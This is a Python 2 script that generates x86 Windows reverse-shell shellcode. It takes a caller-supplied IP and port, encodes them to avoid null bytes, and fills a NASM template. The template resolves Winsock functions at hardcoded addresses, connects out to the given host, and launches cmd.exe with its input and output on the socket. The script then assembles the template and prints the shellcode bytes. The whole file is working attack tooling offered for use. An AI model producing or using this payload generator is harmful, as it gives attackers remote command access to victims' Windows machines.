from binascii import unhexlify
import binascii
import sys
import os
from shell import shell
import time
import socket



if len (sys.argv) != 3 :
    print "\r"
    print "Creates x86 Windows Reverse shell"
    print "WARNING: Fails if IP Address has nullbyte"
    print "Usage: python winrev.py 127.0.0.1 4444\r\n"
    sys.exit (1)



def convert_port(port):
    if port <= 65535:
        network_order = socket.htons(port)
        network_hex = hex(network_order)
        return network_order, network_hex
    else:
        print("[!] port range is over 65535")
        sys.exit(1)

def convert_ip_addr(ip_addr):
    ip_addr_hex = hex(int(ip_addr))[2:]

    if len(ip_addr_hex) < 2:
        ip_addr_hex = "0" + ip_addr_hex

    if ip_addr_hex == "00":
        print("[!] The IP Address has shellcode '\\x00' inside")
        # sys.exit(1)

    return ip_addr_hex

def iphasnull(nullip):
	addenc = (0x11111111)
	fixedip = hex(int(nullip,0)+addenc)
	nullfix = """
		mov ebx, %s	;the IP plus 0x11111111 so we avoid NULLs
		sub ebx, 0x11111111	;subtract from ebx to obtain the real IP
		push ebx		;push sin_addr
		""" % fixedip
	return nullfix

port = int(sys.argv[2])
ip_addr = str(sys.argv[1])

network, inhex = convert_port(port)

ip_addr_hex = ""
for i in range(0,4):
    ip_addr_hex += convert_ip_addr(ip_addr.split('.')[::-1][i])

hexport = str("\t%.16s")% inhex
hexport = "push word %s" % hexport
hexip = str("\t0x%.16s") % ip_addr_hex

if "00" in ip_addr_hex:
	hexip = iphasnull(hexip)
else:
	hexip = "push %s" % hexip

shellasm = """
[BITS 32]
global _start

section .text

_start:

.loadWinSock:
	xor eax, eax

	mov ax, 0x3233			;23
	push eax				;includes 0 at the end without insert NULLs
	push 0x5f327377 		;_2sw
	push esp			;pointer to the string

	mov ebx, 0x76df94dc		;0x7b1d807c  	;addr of LoadLibraryA (0x7c801d7b)

	call ebx

	mov ebp, eax			;save winsock handle

.getWSAStartup:
	xor eax, eax

	mov ax, 0x7075      ; 'up'
	push eax
	push 0x74726174     ; 'trat'
	push 0x53415357     ; 'SASW'
	push esp	    ;pointer to the string

	push ebp	    ;winsock handler
	
	mov ebx, 0x76e1903b ;addr of GetProcAddress
	call ebx

.callWSAStartUp:
	xor ebx, ebx
	mov bx, 0x0190
	sub esp, ebx
	push esp
	xor ecx, ecx
	mov cx, 0x0202
	push ecx

	call eax		; WSAStartUp(MAKEWORD(2, 2), wsadata_pointer)


.getWSASocketA:
	xor eax, eax

	mov ax, 0x4174      ; 'At'
	push eax
	push 0x656b636f     ; 'ekco'
	push 0x53415357     ; 'SASW'
	push esp	    ;pointer to the string

	push ebp	    ;socket handler
	
	mov ebx, 0x76e1903b  ;addr of GetProcAddress
	call ebx

.callWSASocketA:
	xor ebx, ebx		;clear ebx
	push ebx;		;dwFlags=NULL
	push ebx;		;g=NULL
	push ebx;		;lpProtocolInfo=NULL
	
	xor ecx, ecx		;clear ecx
	mov cl, 0x6		;protocol=6
	push ecx

	inc ebx			;ebx==1
	push ebx		;type=1
	inc ebx			;af=2
	push ebx

	call eax		;call WSASocketA

	push eax		;save eax in edx
	pop edi			;...

.getConnect:
	xor eax, eax

	mov eax, 0x74636590     ;
	shr eax, 8
	push eax
	push 0x6e6e6f63     ;'nnoc'
	push esp	    ;pointer to the string

	push ebp	    ;socket handler
	
	mov ebx,  0x76e1903b ;addr of GetProcAddress
	call ebx

.callConnect:
	%s
	%s
	xor ebx, ebx
	mov bl, 2
	push bx	
	mov edx, esp

	push byte 0x10
	push edx
	push edi

	call eax

.shell:
	mov ebx, 0x646D6390    ; push our command line: 'cmd',0 padded with
	shr ebx, 8
	push ebx
	mov ebx, esp           ; save a pointer to the command line
	push edi               ; our socket becomes the shells hStdError
	push edi               ; our socket becomes the shells hStdOutput
	push edi               ; our socket becomes the shells hStdInput
	xor esi, esi           ; Clear ESI for all the NULL's we need to push
	push byte 0x12         ; We want to place (18 * 4) = 72 null bytes onto the stack
	pop ecx                ; Set ECX for the loop

push_loop:
	push esi               ; push a null dword
	loop push_loop         ; keep looping untill we have pushed enough nulls
	mov word [esp + 0x3C], 0x0101 ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
	mov byte [esp + 0x10], 0x44
	lea eax, [esp + 0x10]  ; Set EAX as a pointer to our STARTUPINFO Structure

  	;perform the call to CreateProcessA
	push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
	push eax               ; Push the pointer to the STARTUPINFO Structure
	push esi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
	push esi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
	push esi               ; We dont specify any dwCreationFlags 
	inc esi                ; Increment ESI to be one
	push esi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
	dec esi                ; Decrement ESI back down to zero
	push esi               ; Set lpThreadAttributes to NULL
	push esi               ; Set lpProcessAttributes to NULL
	push ebx               ; Set the lpCommandLine to point to "cmd",0
	push esi               ; Set lpApplicationName to NULL as we are using the command line param instead

	mov ebx, 0x76dd1c28   ; CreateProcessA
	call ebx

	xor eax, eax           ; zero out eax (NULL)
	push eax               ; put zero to stack (exitcode parameter)
	mov eax, 0x76e141d8    ; ExitProcess(exitcode) 
	call eax               ; exit cleanly 

	""" %(hexip,hexport)
print "Writing to template...\n%s\n%s " % (hexport,hexip)

file = open("shellcode.asm","wb")
file.write(shellasm)
file.close()

writeasm = shell('nasm shellcode.asm')
print "Creating shellcode..."

bindshell = 'shellcode = ("'
length = 0
with open("shellcode", "rb") as f:
    byte = f.read(1)
    while byte != "":
        if len(byte) > 0:
            bindshell += '\\x' + '%02.X' % ord(byte)
            length += 1
        byte = f.read(1)
bindshell += '")'
print "Length: %s bytes\n " % str(length)
print bindshell

# clearbin = shell('rm shellcode')
clearasm = shell('rm shellcode.asm')
        
